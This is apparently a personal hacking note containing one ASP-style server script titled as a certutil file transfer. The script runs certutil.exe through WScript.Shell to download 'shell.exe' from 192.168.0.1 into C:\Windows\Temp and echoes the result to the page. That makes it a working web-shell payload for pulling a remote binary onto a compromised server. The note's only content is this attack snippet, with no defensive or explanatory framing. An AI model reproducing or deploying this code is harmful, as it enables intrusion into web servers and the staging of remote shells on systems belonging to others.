# Active Sever Pages Extended (.aspx) Transfer A File (Certutil)
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

` zet/20221003150556/README.md `

# Related

- [20221007220451](/zet/20221007220451/README.md) hacking notes node


Tags:

    
